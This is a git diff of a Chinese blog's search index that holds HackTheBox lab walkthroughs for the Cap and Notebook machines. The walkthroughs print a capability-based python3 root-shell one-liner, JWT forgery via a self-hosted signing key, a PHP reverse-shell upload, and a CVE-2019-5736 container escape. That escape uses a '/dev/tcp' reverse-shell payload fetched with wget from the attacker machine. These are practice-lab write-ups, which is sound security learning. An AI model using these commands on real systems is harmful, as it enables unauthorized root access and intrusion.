@@ -1,6 +1,79 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>HACKthebox-Cap</title>
+    <url>/2022/01/07/HackTheBox-Cap/</url>
+    <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.6</p>
+<p>目标IP：10.10.10.245</p>
+</blockquote>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Cap_nmap.png" alt="nmap"></p>
+<p>开放了21、22、80端口</p>
+<p>常规操作访问一下网站看看干嘛的</p>
+<p>这个网站挺有意思，起到了类似服务器仪表盘的作用，能看本地启动的服务、IP等等</p>
+<p>在<code>Security Snapshot</code>里可以看到流量记录</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F.png" alt="流量"></p>
+<p>本来下载流量包看了一下全是我自己访问的流量突然就没思路了</p>
+<p>然后切到其他页面看了下功能又切回来以后发现URL有变化，<code>.../data/</code>斜杠后面的数字变了，试试看其他的数字都和上图一样，估计都是我的访问流量，当访问<code>.../data/0</code>的时候不一样了</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F2.png" alt="流量2"></p>
+<p>下载流量包，用<code>Wireshark</code>分析一下</p>
+<p>找到了nathan用户的用户名密码</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pcap.png" alt="pcap"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER： nathan     PASS Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
+
+<p>上面提到服务器还开放了21、22端口，尝试用刚得到的用户名密码连接</p>
+<p><strong>FTP</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ftp.png" alt="ftp"></p>
+<p>成功登录，发现了user.txt，下载下来得到user flag</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>SSH</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh james@10.10.10.245</span><br></pre></td></tr></table></figure>
+
+<p>成功连接</p>
+<p>在提权上遇到了问题，首先Linux提权的姿势太多了，以前做的Linux靶机用的大多是<strong>sudo提权滥用</strong>，但是靶机中<code>nathan</code>用户没有使用sudo的权限，所以只能用其他的手段了。</p>
+<p>本台靶机的名字叫cap，google上搜的时候也围绕这个点去找，发现在Linux常用命令里有<code>getcap</code>和<code>setcap</code>，接着发现了一篇很棒的文章（参考链接二），还有一个碉堡了的网站（参考链接三）</p>
+<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX/LINUX操作系统中超级用户/普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作.</p>
+<p><strong>Capabilities</strong>的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而<strong>CAP_SETUID表示用户能够修改进程用户身份的特权操作</strong>。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制</p>
+<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为<code>cap_effective</code>, <code>cap_inheritable</code>, <code>cap_permitted</code>(分别简记为:pE,pI,pP)</p>
+<p><strong>cap_permitted</strong>表示进程所拥有的最大能力集；</p>
+<p><strong>cap_effective</strong>表示进程当前可用的能力集，可以看做是cap_permitted的一个子集；</p>
+<p><strong>cap_inheitable</strong>则表示进程可以传递给其子进程的能力集。</p>
+<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和 cap_forced（分别简记为fE,fI,fP），其中cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集，cap_forced表示运行文件时必须拥有才能完成其服务的能力集；而cap_effective则表示文件开始运行时可以使用的能力。</p>
+<p>各种能力就不一一列举了，参考文章中写的很详细，本台靶机的提权用了<code>CAP_SETUID</code></p>
+<blockquote>
+<p>CAP_SETUID:允许改变进程的用户ID</p>
+</blockquote>
+<p>用<code>getcap</code>命令查看可执行文件获取的内核权限</p>
+<blockquote>
+<p>getcap [-v] [-r] [-h] [-n] <filename> [<filename> …]</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null  #把错误输出到/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getcap.png" alt="getcap"></p>
+<p>发现 python3.8 有<code>cap_setuid</code>，可以拿来利用提权了，提权方法在<a href="https://gtfobins.github.io/">GTFOBins</a>上找到的</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gtfobins.png" alt="gtfobins"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#x27; #python3.8或者python3都行</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到root权限</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
+<p>得到root flag</p>
+<p>end</p>
+<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>Linux靶机的提权还是需要更多的学习和积累，虽然本台靶机整个流程很短，也没有什么网站上的漏洞利用直接就连上了，但还是有学到东西的。实际操作得来的经验比起光看博客和书本要印象更加深刻</p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355">https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355</a></p>
+<p><a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">https://www.cnblogs.com/sky-heaven/p/12096758.html</a></p>
+<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
+]]></content>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Hackthebox-Armageddon</title>
     <url>/2022/01/07/HackTheBox-Armageddon/</url>
     <content><![CDATA[<h1 id="Hackthebox-Armageddon"><a href="#Hackthebox-Armageddon" class="headerlink" title="Hackthebox-Armageddon"></a>Hackthebox-Armageddon</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Armg_pwn.png" alt="pwn"></p>
@@ -118,79 +191,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HACKthebox-Cap</title>
-    <url>/2022/01/07/HackTheBox-Cap/</url>
-    <content><![CDATA[<h1 id="HackTheBox-Cap"><a href="#HackTheBox-Cap" class="headerlink" title="HackTheBox-Cap"></a>HackTheBox-Cap</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/cap_pwn.png" alt="cap_pwn"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>本机IP：10.10.16.6</p>
-<p>目标IP：10.10.10.245</p>
-</blockquote>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Cap_nmap.png" alt="nmap"></p>
-<p>开放了21、22、80端口</p>
-<p>常规操作访问一下网站看看干嘛的</p>
-<p>这个网站挺有意思，起到了类似服务器仪表盘的作用，能看本地启动的服务、IP等等</p>
-<p>在<code>Security Snapshot</code>里可以看到流量记录</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F.png" alt="流量"></p>
-<p>本来下载流量包看了一下全是我自己访问的流量突然就没思路了</p>
-<p>然后切到其他页面看了下功能又切回来以后发现URL有变化，<code>.../data/</code>斜杠后面的数字变了，试试看其他的数字都和上图一样，估计都是我的访问流量，当访问<code>.../data/0</code>的时候不一样了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E6%B5%81%E9%87%8F2.png" alt="流量2"></p>
-<p>下载流量包，用<code>Wireshark</code>分析一下</p>
-<p>找到了nathan用户的用户名密码</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/pcap.png" alt="pcap"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">USER： nathan     PASS Buck3tH4TF0RM3!</span><br></pre></td></tr></table></figure>
-
-<p>上面提到服务器还开放了21、22端口，尝试用刚得到的用户名密码连接</p>
-<p><strong>FTP</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ftp.png" alt="ftp"></p>
-<p>成功登录，发现了user.txt，下载下来得到user flag</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><strong>SSH</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh james@10.10.10.245</span><br></pre></td></tr></table></figure>
-
-<p>成功连接</p>
-<p>在提权上遇到了问题，首先Linux提权的姿势太多了，以前做的Linux靶机用的大多是<strong>sudo提权滥用</strong>，但是靶机中<code>nathan</code>用户没有使用sudo的权限，所以只能用其他的手段了。</p>
-<p>本台靶机的名字叫cap，google上搜的时候也围绕这个点去找，发现在Linux常用命令里有<code>getcap</code>和<code>setcap</code>，接着发现了一篇很棒的文章（参考链接二），还有一个碉堡了的网站（参考链接三）</p>
-<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p>从2.1版开始,Linux内核有了能力(capability)的概念,即它打破了UNIX/LINUX操作系统中超级用户/普通用户的概念,由普通用户也可以做只有超级用户可以完成的工作.</p>
-<p><strong>Capabilities</strong>的主要思想在于分割root用户的特权，即将root的特权分割成不同的能力，每种能力代表一定的特权操作。例如：能力CAP_SYS_MODULE表示用户能够加载(或卸载)内核模块的特权操作，而<strong>CAP_SETUID表示用户能够修改进程用户身份的特权操作</strong>。在Capbilities中系统将根据进程拥有的能力来进行特权操作的访问控制</p>
-<p>在Capilities中，只有进程和可执行文件才具有能力，每个进程拥有三组能力集，分别称为<code>cap_effective</code>, <code>cap_inheritable</code>, <code>cap_permitted</code>(分别简记为:pE,pI,pP)</p>
-<p><strong>cap_permitted</strong>表示进程所拥有的最大能力集；</p>
-<p><strong>cap_effective</strong>表示进程当前可用的能力集，可以看做是cap_permitted的一个子集；</p>
-<p><strong>cap_inheitable</strong>则表示进程可以传递给其子进程的能力集。</p>
-<p>系统根据进程的cap_effective能力集进行访问控制，cap_effective为cap_permitted的子集，进程可以通过取消cap_effective中的某些能力来放弃进程的一些特权。可执行文件也拥有三组能力集，对应于进程的三组能力集，分别称为cap_effective, cap_allowed 和 cap_forced（分别简记为fE,fI,fP），其中cap_allowed表示程序运行时可从原进程的cap_inheritable中集成的能力集，cap_forced表示运行文件时必须拥有才能完成其服务的能力集；而cap_effective则表示文件开始运行时可以使用的能力。</p>
-<p>各种能力就不一一列举了，参考文章中写的很详细，本台靶机的提权用了<code>CAP_SETUID</code></p>
-<blockquote>
-<p>CAP_SETUID:允许改变进程的用户ID</p>
-</blockquote>
-<p>用<code>getcap</code>命令查看可执行文件获取的内核权限</p>
-<blockquote>
-<p>getcap [-v] [-r] [-h] [-n] <filename> [<filename> …]</p>
-</blockquote>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getcap -r / 2&gt;/dev/null  #把错误输出到/dev/null</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/getcap.png" alt="getcap"></p>
-<p>发现 python3.8 有<code>cap_setuid</code>，可以拿来利用提权了，提权方法在<a href="https://gtfobins.github.io/">GTFOBins</a>上找到的</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/gtfobins.png" alt="gtfobins"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -c &#x27;import os;os.setuid(0);os.system(&quot;/bin/sh&quot;)&#x27; #python3.8或者python3都行</span><br></pre></td></tr></table></figure>
-
-
-
-<p>拿到root权限</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/rootflag.png" alt="rootflag"></p>
-<p>得到root flag</p>
-<p>end</p>
-<h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后"></a>写在最后</h2><p>Linux靶机的提权还是需要更多的学习和积累，虽然本台靶机整个流程很短，也没有什么网站上的漏洞利用直接就连上了，但还是有学到东西的。实际操作得来的经验比起光看博客和书本要印象更加深刻</p>
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355">https://cloud.tencent.com/developer/article/1544037?from=article.detail.1180355</a></p>
-<p><a href="https://www.cnblogs.com/sky-heaven/p/12096758.html">https://www.cnblogs.com/sky-heaven/p/12096758.html</a></p>
-<p><a href="https://gtfobins.github.io/gtfobins/python/">https://gtfobins.github.io/gtfobins/python/</a></p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox-Dynstr</title>
     <url>/2022/01/07/HackTheBox-Dynstr/</url>
     <content><![CDATA[<h1 id="HackTheBox-Dynstr"><a href="#HackTheBox-Dynstr" class="headerlink" title="HackTheBox-Dynstr"></a>HackTheBox-Dynstr</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/dynstr_pwn.png" alt="pwn"></p>
@@ -211,7 +211,7 @@
 <p>dnsalias.htb</p>
 <p>dynamicdns.htb</p>
 <p>no-ip.htb</p>
-<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#110;&#x73;&#x40;&#100;&#x79;&#110;&#x61;&#46;&#104;&#x74;&#98;">&#x64;&#110;&#x73;&#x40;&#100;&#x79;&#110;&#x61;&#46;&#104;&#x74;&#98;</a>获得)</p>
+<p>dyna.htb(由网页底部<a href="mailto:&#x64;&#x6e;&#115;&#x40;&#100;&#121;&#x6e;&#x61;&#x2e;&#x68;&#x74;&#98;">&#x64;&#x6e;&#115;&#x40;&#100;&#121;&#x6e;&#x61;&#x2e;&#x68;&#x74;&#98;</a>获得)</p>
 </blockquote>
 <p>Beta中说网站正在测试模式下运行，并提供了共享凭据：</p>
 <blockquote>
@@ -549,112 +549,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HackTheBox-theNotebook</title>
-    <url>/2022/01/07/HackTheBox-theNotebook/</url>
-    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
-<span id="more"></span>
-
-<blockquote>
-<p>本机IP：10.10.16.11</p>
-<p>目标IP：10.10.10.230</p>
-</blockquote>
-<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
-<p>2.CVE-2019-5736 docker容器逃逸</p>
-<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
-<p>还是熟悉的22和80端口，访问下网站</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
-<p>测试了一下，登录和注册界面应该不存在sql注入</p>
-<p>尝试注册admin发现用户已经存在了</p>
-<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
-<p>简单测试一下似乎也不存在xss漏洞</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
-<p>发现F12 请求头里的cookie长得很像jwt</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
-<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
-<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
-<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
-<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
-<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
-<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl genrsa -out privKey.key 1024</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_privkey.png" alt="privkey"></p>
-<p>用python3在本地起一个服务，让目标从本机获取私钥</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m http.server 7070</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwtfake.png" alt="jwtfake"></p>
-<p>用生成的jwt令牌替换原来的，访问/<code>admin</code>，成功进入管理员界面</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_admin.png" alt="admin"></p>
-<p>管理员界面有两个功能（查看Notes和文件上传）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/viewnote.png" alt="viewnote"></p>
-<p>管理员能同时查看所有注册用户和Admin的notes，其中有两篇中泄露了部分信息供参考</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_php.png" alt="php"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/backups.png" alt="backups"></p>
-<p>①存在PHP文件执行的问题需要解决 ②服务器上有备份</p>
-<h2 id="GetShell"><a href="#GetShell" class="headerlink" title="GetShell"></a>GetShell</h2><p>如果可以运行php文件，那么我们可以通过PHP文件执行的问题来上传一个php文件反弹shell</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/uploadshell.png" alt="uploadshell"></p>
-<p>上传shell.php查看文件成功收到反弹回来的shell，升级为交互式shell（关于交互式和非交互式shell的区别可以自行百度）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SHELL=/bin/bash script -q /dev/null -q参数为静默运行，输出到/dev/null（黑洞）里，如果不加script -q /dev/null不会新启一个bash，shell=/bin/bash只是设置shell为bash，加了以后会给你挂起一个新的shell，并帮你记录所有内容</span><br><span class="line">export TERM=xterm #运行xterm 一种终端</span><br><span class="line">ctrl+z #netcat挂后台</span><br><span class="line">stty raw -echo;fg #stty raw 设置原始输入 -echo 禁止回显，当您在键盘上输入时，并不出现在屏幕上 将本地终端置于原始模式，以免干扰远程终端</span><br><span class="line">reset #重置远程终端</span><br><span class="line">或者</span><br><span class="line">script /dev/null  //这是偷懒的方法，用起来不是很方便，但是像su之类的命令都可以执行</span><br><span class="line">或者</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27; //需要python环境</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_%E4%BA%A4%E4%BA%92%E5%BC%8Fshell.png" alt="交互式shell"></p>
-<p>查看<code>/etc/passwd</code>中看到有个<code>noah</code>用户</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/finduser.png" alt="finduser"></p>
-<p>从上面我们可以发现已经提示过有备份文件，访问<code>/var/backups</code>，发现备份文件<code>home.tar.gz</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/findbackups.png" alt="findbackups"></p>
-<p>因为目标服务器上有python3环境，可以起一个web服务，把备份文件<code>home.tar.gz</code>下载到本机</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/receivetar.png" alt="receivetar"></p>
-<p>解压备份文件发现里面有<code>noah</code>用户的SSH密钥</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_idrsa.png" alt="idrsa"></p>
-<p>通过SSH连接<code>10.10.10.230</code>，在桌面可以得到<code>user.txt</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/noah.png" alt="noah"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p><code>sudo -l</code>查看用户当前用户可执行的指令，用户可以不需要密码在docker容器执行部分命令</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_sudo.png" alt="sudo"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp_dev01 xxx</span><br></pre></td></tr></table></figure>
-
-<p>查看docker版本为<strong>18.06.0-ce</strong>,google搜一波发现了CVE-2019-5736docker容器逃逸漏洞</p>
-<p>参考：</p>
-<p><a href="https://github.com/Frichetten/CVE-2019-5736-PoC">https://github.com/Frichetten/CVE-2019-5736-PoC</a></p>
-<p><a href="https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html">https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html</a></p>
-<h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>runC是一个根据OCI(Open Container Initiative)标准创建并运行容器的CLI(command-line interface) 工具。runC是Docker中最为核心的部分，容器的创建、运行、销毁等操作最终都是通过调用runC完成。</p>
-<p>CVE-2019-5736，导致18.09.2版本之前的Docker允许恶意容器覆盖宿主机上的runC二进制文件，由此使攻击者能够以root身份在宿主机上执行任意命令。恶意容器需满足以下两个条件之一:</p>
-<p>(1)由一个攻击者控制的恶意镜像创建</p>
-<p>(2)攻击者具有某已存在容器的写权限，且可通过docker exec进入。</p>
-<p>POC的利用需要在容器内拥有root，由于覆盖了<code>/bin/sh</code>所以当我们把修改好Payload的二进制文件main下载到docker中执行，下次再有人调用docker容器中的<code>/bin/sh</code>就会触发Payload。</p>
-<p>通过修改payload反弹一个shell到本机以获得root</p>
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1.SSH连接到目标主机，通过<code>sudo docker exec -it webapp-dev01 bash</code>在docker上执行命令，（暂且称之为SSH1）同时用另一个在另一个命令行窗口SSH连接到目标主机（SSH2）</p>
-<p>2.在本地改好修改好Payload，执行<code>go build main.go</code>生成二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var payload = &quot;#!/bin/bash \n bash -i &gt;&amp; /dev/tcp/10.10.16.11/9999 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/maingo.png" alt="maingo"></p>
-<p>3.在二进制文件所在目录用python起一个web服务</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_webserver.png" alt="webserver"></p>
-<p>4.在docker容器中执行命令从本机获取二进制文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.10.16.11:8000/main</span><br></pre></td></tr></table></figure>
-
-<p>5.赋予二进制文件最高权限，并执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x main &amp;&amp; ./main</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh1main.png" alt="ssh1main"></p>
-<p>6.监听9999端口（端口根据payload里面的来）</p>
-<p>7.在SSH1中二进制文件运行并覆盖完成<code>/bin/sh</code>，SSH2执行如下命令即可收到反弹回来的shell</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo docker exec -it webapp-dev01 /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/ssh2.png" alt="ssh2"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_rootshell.png" alt="rootshell"></p>
-<p>root.txt在<code>/root</code>目录下</p>
-<p>如果流程看不懂，还有终极图解方便理解（文字表达能力较差，各位师傅多担待）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/%E5%85%A8%E5%B1%80.png" alt="全局"></p>
-<p>可能出现问题的点估计就是提权了，我也好久弹不出Shell…</p>
-]]></content>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>渗透测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>HackTheBox-Pit</title>
     <url>/2022/01/07/HackTheBox-Pit/</url>
     <content><![CDATA[<h1 id="Hackthebox-Pit"><a href="#Hackthebox-Pit" class="headerlink" title="Hackthebox-Pit"></a>Hackthebox-Pit</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/Pit_pwn.png" alt="pwn"></p>
@@ -796,6 +690,112 @@
       </tags>
   </entry>
   <entry>
+    <title>HackTheBox-theNotebook</title>
+    <url>/2022/01/07/HackTheBox-theNotebook/</url>
+    <content><![CDATA[<h1 id="Hackthebox-theNotebook"><a href="#Hackthebox-theNotebook" class="headerlink" title="Hackthebox-theNotebook"></a>Hackthebox-theNotebook</h1><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_pwned.png" alt="pwned"></p>
+<span id="more"></span>
+
+<blockquote>
+<p>本机IP：10.10.16.11</p>
+<p>目标IP：10.10.10.230</p>
+</blockquote>
+<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>1.jwt令牌伪造</p>
+<p>2.CVE-2019-5736 docker容器逃逸</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p><strong>nmap</strong></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_nmap.png" alt="nmap"></p>
+<p>还是熟悉的22和80端口，访问下网站</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/notebook.png" alt="notebook"></p>
+<p>测试了一下，登录和注册界面应该不存在sql注入</p>
+<p>尝试注册admin发现用户已经存在了</p>
+<p>注册登陆以后的功能就是<strong>notebook</strong>的笔记功能，类似于备忘录吧</p>
+<p>简单测试一下似乎也不存在xss漏洞</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_xss.png" alt="xss"></p>
+<p>发现F12 请求头里的cookie长得很像jwt</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/TNB_session.png" alt="session"></p>
+<p>拿到<a href="https://jwt.io/%E5%8E%BB%E8%A7%A3%E7%A0%81%E4%B8%80%E4%B8%8B%EF%BC%8C%E6%9E%9C%E7%84%B6%E6%98%AFjwt">https://jwt.io/去解码一下，果然是jwt</a></p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/jwt.png" alt="jwt"></p>
+<p><strong>HEADER</strong>里的kid似乎是从本地7070端口获得一个密钥，7070的端口未开放</p>
+<p><strong>PAYLOAD</strong>部分可以看到<code>admin_cap:0</code>，刚才注册时候已经发现admin用户被注册了</p>
+<p>直接访问<code>xx/admin</code>发现报错Forbidden</p>
+<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/forbidden.png" alt="forbidden"></p>
+<p>参考：<a href="https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c">https://blog.pentesteracademy.com/hacking-jwt-tokens-kid-claim-misuse-key-leak-e7fce9a10a9c</a></p>
+<h2 id="伪造JWT令牌"><a href="#伪造JWT令牌" class="headerlink" title="伪造JWT令牌"></a>伪造JWT令牌</h2><p>思路比较清晰了，自己生成一个私钥对jwt签名，并将当前用户设置为管理员</p>
